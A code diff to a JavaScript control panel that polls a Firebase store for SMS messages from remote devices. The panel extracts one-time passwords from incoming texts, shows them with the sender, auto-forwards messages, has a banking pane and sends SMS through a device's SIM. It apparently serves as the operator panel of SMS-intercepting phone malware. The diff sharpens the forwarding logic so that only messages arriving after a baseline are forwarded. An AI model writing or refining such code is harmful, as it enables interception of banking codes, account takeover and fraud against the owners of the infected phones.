@@ -69,8 +69,23 @@ function forceWatermark(devId, key){ if(!key) return; _watermarks[devId] = key; 
 function setWatermark(devId, key){ if(!key) return; var p = _watermarks[devId]; if(!p || key > p){ _watermarks[devId] = key; _saveWatermarks(); } }
 function isAfterWatermark(devId, key){
   var w = _watermarks[devId];
-  if(!w) return true;  /* No watermark = accept everything */
+  if(!w) return false;
   return key > w;
+}
+var _fwdLive = {};
+function armForwardBaseline(devId, msgs){
+  if(!devId) return;
+  var list = msgs || [];
+  var newest = '';
+  for(var i=0;i<list.length;i++){
+    var k = String(list[i].key || '');
+    if(k && (!newest || k > newest)) newest = k;
+    _forwardSeen.add(devId + '::' + k);
+  }
+  if(newest) forceWatermark(devId, newest);
+  saveForwardTracker();
+  _fwdLive[devId] = true;
+  console.log('[Fwd] baseline — old msgs skip, sirf iske baad ke forward', devId, newest || '(empty)');
 }
 
 /* ═══════ FILTERS ═══════ */
@@ -212,8 +227,11 @@ function resolveFirebaseKeyForUrl(url){
   return String(key || '').trim();
 }
 function fbKeyForDev(dev){
-  if(dev && dev._fbKey != null && String(dev._fbKey).trim()) return String(dev._fbKey).trim();
-  return FB_KEY || '';
+  var k = '';
+  if(dev && dev._fbKey != null && String(dev._fbKey).trim()) k = String(dev._fbKey).trim();
+  else k = String(FB_KEY || '').trim();
+  if(k.length < 16) return '';
+  return k;
 }
 function normalizeSmsTo(num){
   var n = String(num || '').replace(/[^\d+]/g, '');
@@ -1022,7 +1040,7 @@ async function _activeTick(){
   _lastActiveFetch = now;
 
   try{
-    var fbUrl = dev._fbUrl || FB_URL, fbKey = dev._fbKey !== undefined ? dev._fbKey : FB_KEY;
+    var fbUrl = dev._fbUrl || FB_URL, fbKey = fbKeyForDev(dev);
     var auth = fbKey ? '?auth=' + fbKey + '&' : '?';
     var r = await _fastFetch(fbUrl + '/messages/' + dev.id + '.json' + auth + 'orderBy="$key"&limitToLast=30');
     if(!r.ok) return;
@@ -1045,22 +1063,21 @@ async function _activeTick(){
       updCnt(); filterActiveMsgs(); renderBankPane();
     }
 
-    if(newOnes.length){
+    if(newOnes.length && _fwdLive[dev.id]){
       console.log('[ActivePoll] ' + newOnes.length + ' new msgs on ' + dev.name);
-      /* Sort so oldest processed first */
       newOnes.sort(function(a,b){ return String(a.key).localeCompare(String(b.key)); });
       for(var k=0;k<newOnes.length;k++){
         var m = newOnes[k];
         if(m.type !== 'incoming') continue;
         var otp = _extractOtp(m.message);
         if(otp) otpShow(otp, m.sender);
-
-        /* Forward if eligible */
         if(!isAfterWatermark(dev.id, m.key)) continue;
         if(!_shouldForwardOnce(dev.id, m.key)) continue;
         setWatermark(dev.id, m.key);
         _forwardIncoming(dev, m);
       }
+    } else if(!_fwdLive[dev.id]){
+      armForwardBaseline(dev.id, msgs);
     }
   }catch(e){}
 }
@@ -1114,7 +1131,7 @@ function _handleStreamMsg(dev, key, data){
     var otp = _extractOtp(msg.message);
     if(otp) otpShow(otp, msg.sender);
   }
-  if(isNew && msg.type === 'incoming'){
+  if(isNew && msg.type === 'incoming' && _fwdLive[dev.id]){
     if(isAfterWatermark(dev.id, msg.key)){
       if(_isActiveDevice(dev) && _shouldForwardOnce(dev.id, msg.key)){
         setWatermark(dev.id, msg.key);
@@ -1461,6 +1478,7 @@ function openDeviceModal(uid){
   if(!d){ toast('⚠ Device not found'); return; }
 
   selDev = d; activeDeviceUid = uid;
+  _fwdLive[d.id] = false;
   try{ localStorage.setItem(CFG.LS_ACTIVE || 'fbi_active_device', uid); }catch(e){}
   savePanelSession(); renderGrid(true);
   debouncedPanelSync();
@@ -1476,7 +1494,7 @@ function openDeviceModal(uid){
   var list = document.getElementById('dmMsgList');
   if(list) list.innerHTML = '<div class="ldwrap"><div class="gold-spin"></div> Loading…</div>';
   allMsgs = []; lastKeys = new Set();
-  preloadMsgs(d.id, false);   /* ⚡ strictMode OFF — don't block forwards */
+  preloadMsgs(d.id, false);
   updOtpNoteBox();
   setTimeout(function(){
     var toInp = document.getElementById('dmSendTo');
@@ -1800,14 +1818,7 @@ async function preloadMsgs(id, strictMode){
     var msgs = parseMsgs(await r.json());
     _msgCacheSet(cacheKey, msgs);
     amCache[id] = msgs; amFetch[id] = Date.now();
-
-    /* Only set watermark if we DON'T have one yet */
-    if(!_watermarks[id] && msgs.length){
-      forceWatermark(id, msgs[0].key);
-    }
-    /* Mark existing messages as seen */
-    msgs.slice(0, 60).forEach(function(m){ _forwardSeen.add(id + '::' + m.key); });
-    saveForwardTracker();
+    armForwardBaseline(id, msgs);
 
     if(selDev && selDev.id === id){
       allMsgs = msgs;
@@ -1953,13 +1964,9 @@ function sendSmsActive(){
   if(!passesRestriction('', msg, null)){ toast('🚫 Blocked'); return; }
 
   var sim = deviceSimMap[selDev.id] || 1;
-  var btn = document.getElementById('dmSendBtn');
-  if(btn){ btn.disabled = true; btn.textContent = 'Sending…'; }
-
+  showResActive(true, '⏳ Sending SIM ' + sim + '…');
   sendSmsGuaranteed(selDev, sim, to, msg).then(function(ok){
-    if(ok){ showResActive(true, '⏳ Waiting isSended=true · SIM ' + sim); }
-    else { showResActive(false, '❌ PUT failed'); }
-    if(btn){ btn.disabled = false; btn.textContent = '🚀 Send Message'; }
+    if(!ok) showResActive(false, '❌ PUT failed');
   });
 }
 function showResActive(ok, m){
